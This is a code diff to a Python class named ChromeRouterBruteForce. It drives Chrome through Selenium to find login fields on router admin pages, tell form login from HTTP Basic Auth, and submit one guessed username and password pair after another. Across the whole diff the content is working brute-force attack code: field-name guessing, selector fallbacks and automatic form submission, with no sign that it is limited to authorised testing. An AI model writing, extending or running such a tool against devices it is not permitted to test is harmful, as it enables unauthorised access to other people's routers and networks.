@@ -259,55 +259,140 @@ class ChromeRouterBruteForce:
     def detect_login_form(self):
         """Detect login form fields on the page"""
         try:
-            # Common field name patterns
+            # Common field name patterns (expanded)
             username_fields = [
                 'username', 'user', 'login', 'admin', 'name', 'email', 'account',
-                'userid', 'user_id', 'loginname', 'login_name', 'uname'
+                'userid', 'user_id', 'loginname', 'login_name', 'uname', 'account_name',
+                'login_id', 'user_name', 'admin_user', 'auth_user', 'login_user'
             ]
             
             password_fields = [
-                'password', 'pass', 'passwd', 'pwd', 'admin', 'secret', 'key'
+                'password', 'pass', 'passwd', 'pwd', 'admin', 'secret', 'key',
+                'user_password', 'login_password', 'admin_password', 'auth_password'
             ]
             
             username_field = None
             password_field = None
             
-            # Try to find username field
+            print(f"{Colors.BLUE}[*] Searching for login form fields...{Colors.END}")
+            
+            # Try to find username field by name
             for field_name in username_fields:
                 try:
-                    username_field = self.driver.find_element(By.NAME, field_name)
-                    break
-                except NoSuchElementException:
-                    try:
-                        username_field = self.driver.find_element(By.ID, field_name)
+                    element = self.driver.find_element(By.NAME, field_name)
+                    if element.is_displayed() and element.is_enabled():
+                        username_field = element
+                        print(f"{Colors.GREEN}[+] Username field found by name: {field_name}{Colors.END}")
                         break
+                except NoSuchElementException:
+                    continue
+            
+            # Try to find username field by ID
+            if not username_field:
+                for field_name in username_fields:
+                    try:
+                        element = self.driver.find_element(By.ID, field_name)
+                        if element.is_displayed() and element.is_enabled():
+                            username_field = element
+                            print(f"{Colors.GREEN}[+] Username field found by ID: {field_name}{Colors.END}")
+                            break
                     except NoSuchElementException:
                         continue
             
-            # Try to find password field
+            # Try to find password field by name
             for field_name in password_fields:
                 try:
-                    password_field = self.driver.find_element(By.NAME, field_name)
-                    break
-                except NoSuchElementException:
-                    try:
-                        password_field = self.driver.find_element(By.ID, field_name)
+                    element = self.driver.find_element(By.NAME, field_name)
+                    if element.is_displayed() and element.is_enabled():
+                        password_field = element
+                        print(f"{Colors.GREEN}[+] Password field found by name: {field_name}{Colors.END}")
                         break
+                except NoSuchElementException:
+                    continue
+            
+            # Try to find password field by ID
+            if not password_field:
+                for field_name in password_fields:
+                    try:
+                        element = self.driver.find_element(By.ID, field_name)
+                        if element.is_displayed() and element.is_enabled():
+                            password_field = element
+                            print(f"{Colors.GREEN}[+] Password field found by ID: {field_name}{Colors.END}")
+                            break
                     except NoSuchElementException:
                         continue
             
             # If not found by name/id, try by type
             if not username_field:
                 try:
-                    username_field = self.driver.find_element(By.XPATH, "//input[@type='text']")
+                    text_inputs = self.driver.find_elements(By.XPATH, "//input[@type='text']")
+                    for input_elem in text_inputs:
+                        if input_elem.is_displayed() and input_elem.is_enabled():
+                            username_field = input_elem
+                            print(f"{Colors.GREEN}[+] Username field found by type: text{Colors.END}")
+                            break
                 except NoSuchElementException:
                     pass
             
             if not password_field:
                 try:
-                    password_field = self.driver.find_element(By.XPATH, "//input[@type='password']")
+                    password_inputs = self.driver.find_elements(By.XPATH, "//input[@type='password']")
+                    for input_elem in password_inputs:
+                        if input_elem.is_displayed() and input_elem.is_enabled():
+                            password_field = input_elem
+                            print(f"{Colors.GREEN}[+] Password field found by type: password{Colors.END}")
+                            break
                 except NoSuchElementException:
                     pass
+            
+            # If still not found, try CSS selectors
+            if not username_field or not password_field:
+                try:
+                    # Try CSS selectors for common patterns
+                    css_selectors = [
+                        "input[type='text']",
+                        "input[type='email']", 
+                        "input[name*='user']",
+                        "input[name*='login']",
+                        "input[id*='user']",
+                        "input[id*='login']"
+                    ]
+                    
+                    for selector in css_selectors:
+                        try:
+                            elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
+                            for element in elements:
+                                if element.is_displayed() and element.is_enabled() and not username_field:
+                                    username_field = element
+                                    print(f"{Colors.GREEN}[+] Username field found by CSS: {selector}{Colors.END}")
+                                    break
+                            if username_field:
+                                break
+                        except:
+                            continue
+                    
+                    # Try password CSS selectors
+                    password_css_selectors = [
+                        "input[type='password']",
+                        "input[name*='pass']",
+                        "input[id*='pass']"
+                    ]
+                    
+                    for selector in password_css_selectors:
+                        try:
+                            elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
+                            for element in elements:
+                                if element.is_displayed() and element.is_enabled() and not password_field:
+                                    password_field = element
+                                    print(f"{Colors.GREEN}[+] Password field found by CSS: {selector}{Colors.END}")
+                                    break
+                            if password_field:
+                                break
+                        except:
+                            continue
+                            
+                except Exception as e:
+                    print(f"{Colors.YELLOW}[!] CSS selector search failed: {e}{Colors.END}")
             
             return username_field, password_field
             
@@ -612,15 +697,79 @@ class ChromeRouterBruteForce:
         except Exception as e:
             return False, f"HTTP Basic Auth error: {e}"
     
+    def detect_authentication_type(self, login_url):
+        """Detect the type of authentication used by the login page"""
+        try:
+            # Navigate to login page
+            self.driver.get(login_url)
+            time.sleep(5)  # Wait for page to load
+            
+            current_url = self.driver.current_url
+            page_source = self.driver.page_source.lower()
+            page_title = self.driver.title
+            
+            print(f"{Colors.BLUE}[*] Detecting auth type - URL: {current_url}{Colors.END}")
+            print(f"{Colors.BLUE}[*] Page title: {page_title}{Colors.END}")
+            
+            # Check if page loaded properly
+            if not page_title or page_title.strip() == "":
+                print(f"{Colors.YELLOW}[!] Page title is empty, trying to refresh...{Colors.END}")
+                self.driver.refresh()
+                time.sleep(5)
+                page_title = self.driver.title
+                print(f"{Colors.BLUE}[*] After refresh - Page title: {page_title}{Colors.END}")
+            
+            # Check for error pages
+            error_indicators = ['this site can\'t be reached', 'site can\'t be reached', 'connection refused', 'timeout', 'error', 'not found', 'unavailable']
+            if any(error in page_source for error in error_indicators):
+                return "error", "Error page detected"
+            
+            # Check for login form indicators
+            form_indicators = ['username', 'password', 'login', 'sign in', 'authentication', 'enter credentials', 'user login', 'admin login', 'router login']
+            form_count = sum(1 for indicator in form_indicators if indicator in page_source)
+            
+            # Check for input fields
+            try:
+                username_inputs = self.driver.find_elements("css selector", "input[type='text'], input[type='email'], input[name*='user'], input[name*='login'], input[id*='user'], input[id*='login']")
+                password_inputs = self.driver.find_elements("css selector", "input[type='password']")
+                
+                if len(username_inputs) > 0 and len(password_inputs) > 0:
+                    print(f"{Colors.GREEN}[+] Form-based authentication detected{Colors.END}")
+                    return "form", "Form-based authentication with login fields"
+                elif form_count >= 2:
+                    print(f"{Colors.GREEN}[+] Form-based authentication detected (by content){Colors.END}")
+                    return "form", "Form-based authentication detected by content"
+                else:
+                    print(f"{Colors.BLUE}[*] No clear form detected, trying HTTP Basic Auth{Colors.END}")
+                    return "basic", "No form detected, trying HTTP Basic Auth"
+                    
+            except Exception as e:
+                print(f"{Colors.YELLOW}[!] Error detecting form fields: {e}{Colors.END}")
+                return "basic", f"Error detecting form: {e}"
+                
+        except Exception as e:
+            return "error", f"Error detecting auth type: {e}"
+    
     def test_credentials(self, username, password, login_url):
         """Test a single set of credentials"""
         try:
             print(f"{Colors.CYAN}[>] Testing credentials: {username}:{password}{Colors.END}")
             
-            # First, try HTTP Basic Authentication
-            basic_auth_success, basic_auth_result = self.test_http_basic_auth(username, password, login_url)
-            if basic_auth_success:
-                return True, basic_auth_result
+            # First, detect authentication type
+            auth_type, auth_reason = self.detect_authentication_type(login_url)
+            print(f"{Colors.BLUE}[*] Authentication type: {auth_type} - {auth_reason}{Colors.END}")
+            
+            if auth_type == "error":
+                return False, f"Page load error: {auth_reason}"
+            
+            # Try HTTP Basic Authentication first (for URLs that might support it)
+            if auth_type == "basic":
+                basic_auth_success, basic_auth_result = self.test_http_basic_auth(username, password, login_url)
+                if basic_auth_success:
+                    return True, basic_auth_result
+            
+            # For form-based authentication or if basic auth failed
+            print(f"{Colors.BLUE}[*] Attempting form-based authentication{Colors.END}")
             
             # Navigate to login page for form-based authentication
             self.driver.get(login_url)
@@ -640,12 +789,15 @@ class ChromeRouterBruteForce:
                 print(f"{Colors.RED}[!] Could not find login form fields{Colors.END}")
                 return False, "Form fields not found"
             
+            print(f"{Colors.GREEN}[+] Login form fields found{Colors.END}")
+            
             # Clear and fill fields
             try:
                 username_field.clear()
                 password_field.clear()
                 username_field.send_keys(username)
                 password_field.send_keys(password)
+                print(f"{Colors.BLUE}[*] Credentials entered{Colors.END}")
             except Exception as e:
                 print(f"{Colors.YELLOW}[!] Could not fill form fields: {e}{Colors.END}")
                 return False, f"Form filling error: {e}"
@@ -655,12 +807,15 @@ class ChromeRouterBruteForce:
             if submit_button:
                 try:
                     submit_button.click()
+                    print(f"{Colors.BLUE}[*] Submit button clicked{Colors.END}")
                 except:
                     # Try pressing Enter on password field
                     password_field.send_keys("\n")
+                    print(f"{Colors.BLUE}[*] Enter key pressed{Colors.END}")
             else:
                 # Try pressing Enter on password field
                 password_field.send_keys("\n")
+                print(f"{Colors.BLUE}[*] Enter key pressed (no submit button found){Colors.END}")
             
             # Wait for page to load and handle any alerts
             time.sleep(5)  # Wait longer for page to load completely
